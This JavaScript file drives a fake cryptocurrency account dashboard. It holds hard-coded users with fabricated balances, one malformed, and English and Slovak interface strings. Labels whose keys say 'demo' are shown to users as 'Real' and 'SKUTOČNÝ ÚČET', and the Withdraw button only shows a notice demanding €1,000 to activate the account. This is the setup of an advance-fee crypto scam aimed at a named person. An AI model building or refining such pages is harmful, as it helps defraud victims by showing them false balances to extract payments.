// ==========================================
// DEMO USERS
// ==========================================

const users = [
    {
        username: "john01",
        password: "Demo123",
        name: "Abut Milly Ojima",
        initials: "AMO",
        balance: "$24,850.736.00",
        language: "en"
    },

    {
        username: "Frantisekpazitny",
        password: "Frantisek444",
        name: "František Pažitný",
        initials: "FP",
        balance: "$3,726,882.00",
        language: "sk"
    }
];


// ==========================================
// TRANSLATIONS
// ==========================================

const translations = {

    en: {
        loginSubtitle: "Sign in to your demo account",
        username: "Username",
        password: "Password",
        login: "Login",
        show: "Show",
        hide: "Hide",
        incorrect: "Incorrect username or password.",
        demoAccount: "CRYPTO ACCOUNT",
        welcome: "Welcome back",
        balance: "Total Balance",
        portfolio: "account value",
        demoData: "Account data only",

        withdraw: "Withdraw",
        withdrawalTitle: "Withdrawal Notice",
        withdrawalText:
            "Account is not yet activated, kindly pay €1,000.00 to activate account before you can withdraw",
        close: "Close",

        assets: "My Assets",
        bitcoin: "Bitcoin",
        tether: "Tether",
        transactions: "Recent Transactions",
        demo: "Real",
        bitcoinReceived: "Bitcoin received",
        usdtSent: "USDT sent",
        usdtReceived: "USDT received",
        received: "Received",
        sent: "Sent",
        logout: "Logout"
    },

    sk: {
        loginSubtitle: "Prihláste sa do svojho Skutočný účtu",
        username: "Používateľské meno",
        password: "Heslo",
        login: "Prihlásiť sa",
        show: "Zobraziť",
        hide: "Skryť",
        incorrect: "Nesprávne používateľské meno alebo heslo.",
        demoAccount: "SKUTOČNÝ ÚČET",
        welcome: "Vitajte späť",
        balance: "Celkový Skutočný zostatok",
        portfolio: "Hodnota Účet",
        demoData: "Iba Účet údaje",

        withdraw: "Výber",
        withdrawalTitle: "Upozornenie na výber",
        withdrawalText:
            "Účet ešte nie je aktivovaný; na jeho aktiváciu a následnú možnosť výberu prostriedkov je potrebné uhradiť sumu 1 000,00 €.",
        close: "Zavrieť",

        assets: "Moje aktíva",
        bitcoin: "Bitcoin",
        tether: "Tether",
        transactions: "Posledné transakcie",
        demo: "Skutočný",
        bitcoinReceived: "Prijatý Bitcoin",
        usdtSent: "Odoslaný USDT",
        usdtReceived: "Prijatý USDT",
        received: "Prijaté",
        sent: "Odoslané",
        logout: "Odhlásiť sa"
    }
};


// ==========================================
// SAFE TEXT FUNCTION
// ==========================================

function setText(id, text) {

    const element = document.getElementById(id);

    if (element) {
        element.textContent = text;
    }
}


// ==========================================
// GET LOGIN ELEMENTS
// ==========================================

const loginPage = document.getElementById("loginPage");
const dashboardPage = document.getElementById("dashboardPage");
const loginForm = document.getElementById("loginForm");

const usernameInput = document.getElementById("username");
const passwordInput = document.getElementById("password");

const loginError = document.getElementById("loginError");


// ==========================================
// LOGIN
// ==========================================

loginForm.addEventListener("submit", function(event) {

    event.preventDefault();

    const username = usernameInput.value.trim();
    const password = passwordInput.value;

    const user = users.find(function(account) {

        return (
            account.username === username &&
            account.password === password
        );

    });


    // Wrong username/password

    if (!user) {

        loginError.textContent =
            "Incorrect username or password.";

        return;
    }


    // Successful login

    loginError.textContent = "";

    if (document.activeElement) {
        document.activeElement.blur();
    }


    // Customer information

    setText("customerName", user.name);
    setText("profile", user.initials);
    setText("totalBalance", user.balance);


    // Change language

    changeLanguage(user.language);


    // Show dashboard

    loginPage.classList.add("hidden");

    dashboardPage.classList.remove("hidden");

});


// ==========================================
// CHANGE LANGUAGE
// ==========================================

function changeLanguage(language) {

    const text = translations[language] || translations.en;


    // Login

    setText("loginSubtitle", text.loginSubtitle);
    setText("usernameLabel", text.username);
    setText("passwordLabel", text.password);
    setText("loginButton", text.login);


    // Dashboard

    setText("dashboardDemo", text.demoAccount);
    setText("welcomeText", text.welcome);
    setText("balanceTitle", text.balance);
    setText("portfolioText", text.portfolio);
    setText("demoDataText", text.demoData);


    // Withdrawal

    setText("withdrawButton", text.withdraw);
    setText("withdrawTitle", text.withdrawalTitle);
    setText("withdrawText", text.withdrawalText);
    setText("closeWithdraw", text.close);


    // Assets

    setText("assetsTitle", text.assets);
    setText("bitcoinName", text.bitcoin);
    setText("tetherName", text.tether);


    // Transactions

    setText("transactionsTitle", text.transactions);
    setText("demoText", text.demo);

    setText("bitcoinReceived", text.bitcoinReceived);
    setText("usdtSent", text.usdtSent);
    setText("usdtReceived", text.usdtReceived);

    setText("received1", text.received);
    setText("sent1", text.sent);
    setText("received2", text.received);


    // Logout

    setText("logoutButton", text.logout);
}


// ==========================================
// SHOW / HIDE PASSWORD
// ==========================================

const showPasswordButton =
    document.getElementById("showPassword");

if (showPasswordButton) {

    showPasswordButton.addEventListener("click", function() {

        if (passwordInput.type === "password") {

            passwordInput.type = "text";

            this.textContent = "Hide";

        } else {

            passwordInput.type = "password";

            this.textContent = "Show";

        }

    });

}


// ==========================================
// WITHDRAWAL TOGGLE
// ==========================================

const withdrawButton =
    document.getElementById("withdrawButton");

const withdrawMessage =
    document.getElementById("withdrawMessage");

const closeWithdraw =
    document.getElementById("closeWithdraw");


if (withdrawButton && withdrawMessage) {

    withdrawButton.addEventListener("click", function() {

        withdrawMessage.classList.toggle("hidden");

    });

}


if (closeWithdraw && withdrawMessage) {

    closeWithdraw.addEventListener("click", function() {

        withdrawMessage.classList.add("hidden");

    });

}

if (closeWithdraw && withdrawMessage) {

    closeWithdraw.addEventListener("click", function() {

        withdrawMessage.classList.add("hidden");

    });

}


// ==========================================
// LOGOUT
// ==========================================

const logoutButton =
    document.getElementById("logoutButton");

if (logoutButton) {

    logoutButton.addEventListener("click", function() {

        dashboardPage.classList.add("hidden");

        loginPage.classList.remove("hidden");

        usernameInput.value = "";

        passwordInput.value = "";

        loginError.textContent = "";

    });

}
